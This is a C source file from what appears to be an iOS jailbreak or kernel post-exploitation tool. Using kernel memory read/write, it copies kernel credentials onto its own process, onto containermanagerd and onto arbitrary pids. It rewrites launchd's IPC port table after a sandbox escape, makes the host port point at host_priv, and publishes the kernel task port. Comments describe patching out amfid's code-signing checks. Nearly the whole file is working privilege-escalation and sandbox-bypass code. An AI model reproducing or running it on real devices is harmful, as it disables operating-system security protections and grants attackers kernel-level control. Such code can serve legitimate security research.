#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libgen.h>
#include <pthread.h>

#include <mach/mach.h>

#include "memctl/core.h"
#include "memctl/privilege_escalation.h"
#include "memctl/process.h"

#include "kernel_memory_helpers.h"
#include "offsets.h"

uint64_t launchd_proc = 0;
uint64_t amfid_proc = 0;
uint64_t containermanager_proc = 0;

uint64_t get_proc_ipc_table(uint64_t proc) {
  uint64_t task_t;
  bool success = proc_task(&task_t, proc);
  assert(success);
  printf("task_t: 0x%llx\n", task_t);
  
  uint64_t itk_space = rk64(task_t + struct_task_itk_space_offset);
  printf("itk_space: 0x%llx\n", itk_space);
  
  uint64_t is_table = rk64(itk_space + struct_ipc_space_is_table_offset);
  printf("is_table: 0x%llx\n", is_table);
  
  return is_table;
}

mach_port_t get_amfid_task_port() {
  mach_port_t amfid_task_port;
  bool success = proc_to_task_port(&amfid_task_port, amfid_proc);
  assert(success);
  return amfid_task_port;
}

mach_port_t get_containermanagerd_task_port(){
  mach_port_t containermanagerd_task_port;
  bool success = proc_to_task_port(&containermanagerd_task_port, containermanager_proc);
  assert(success);
  return containermanagerd_task_port;
}

/*
 * point launchd's send right to mitm_port back to real_service
 */
void fix_launchd_after_sandbox_escape(mach_port_t real_service, mach_port_t mitm_port) {
  uint64_t launchd_ports_table = get_proc_ipc_table(launchd_proc);
  printf("launchd's ipc_table: 0x%llx\n", launchd_ports_table);
  
  uint64_t our_ports_table = get_proc_ipc_table(currentproc);
  
  
  printf("our ipc_table: 0x%llx\n", our_ports_table);
  
  // find the address of the ipc_port for real_service:
  uint64_t real_service_ipc_entry = our_ports_table + ((real_service >> 8) * 0x18);
  uint64_t real_service_ipc_port = rk64(real_service_ipc_entry);
  
  // find the address of the ipc_port for mitm_port:
  uint64_t mitm_port_ipc_entry = our_ports_table + ((mitm_port >> 8) * 0x18);
  uint64_t mitm_port_ipc_port = rk64(mitm_port_ipc_entry);
  
  // scan through the ipc_entrys in launchd's table to find the address of the ipc_entry for mitm_port in launchd:
  uint64_t launchd_entry = launchd_ports_table;
  
  uint64_t port_here = 0;
  for (int port_offset = 0; port_offset < 0x100000; port_offset++) {
    port_here = rk64(launchd_entry);
    if (port_here == mitm_port_ipc_port) {
      break;
    }
    launchd_entry += 0x18;
  }
  
  if (port_here != mitm_port_ipc_port) {
    printf("failed to find the mitm_port in launchd\n");
  } else {
    printf("found the mitm_port in launchd's namespace\n");
  }
  
  // point launchd's entry to the real service:
  wk64(launchd_entry, real_service_ipc_port);
  
  // NULL out our entry completely:
  wk64(real_service_ipc_entry, 0);
  wk64(real_service_ipc_entry+0x08, 0);
  wk64(real_service_ipc_entry+0x10, 0);
}

#define LAUNCHD           "/sbin/launchd"
#define AMFID             "/usr/libexec/amfid"
#define CONTAINERMANAGERD "/System/Library/PrivateFrameworks/MobileContainerManager.framework/Support/containermanagerd"

void disable_protections(mach_port_t host_priv_port, uint64_t realhost) {
  // Give ourselves the kernel credentials so that we can find processes.
  bool success = proc_copy_credentials(currentproc, kernproc);
  assert(success);

  success = proc_find_path(&launchd_proc, LAUNCHD, true);
  assert(success);
  success = proc_find_path(&amfid_proc, AMFID, true);
  assert(success);
  success = proc_find_path(&containermanager_proc, CONTAINERMANAGERD, true);
  assert(success);

  // we can then fix up launchd's send right to the service we messed up
  // and give ourselves launchd's creds
  // then patch out the codesigning checks in amfid.

  // unsandbox containermanagerd so it can make the containers for uid 0 processes
  // I do also have a patch for containermanagerd to fixup the persona_id in the sb_packbuffs
  // but this is much simpler (and also makes it easier to clear up the mess of containers!)
  // I ran out of time to properly undestand containers enough to write a better hook
  // for containermanagerd so this will have to do
  success = proc_copy_credentials(containermanager_proc, kernproc);
  assert(success);

  // make the host port also point to the host_priv port:
  // the host port we gave our task will be reset by the sandbox hook
  uint64_t host_priv = rk64(realhost+0x20); // host special port 2
  wk64(realhost+0x18, host_priv); // host special 1
  
  // while we're at it set the kernel task port as host special port 8 (an unused host special port)
  // so other tools can get at it via host_get_special_port on the host_priv port
  kern_return_t kr = host_set_special_port(host_priv_port, 8, kernel_task);
  if (kr == KERN_SUCCESS) {
    printf("set the kernel task port as host special port 8\n");
  } else {
    printf("failed to set the kernel task port as host special port 8: %s\n", mach_error_string(kr));
  }
}

void unsandbox_pid(pid_t target_pid) {
  kaddr_t proc;
  bool success = proc_find(&proc, target_pid, false);
  assert(success);
  if (proc != 0) {
    success = proc_copy_credentials(proc, kernproc);
    assert(success);
    success = proc_rele(proc);
    assert(success);
  }
}
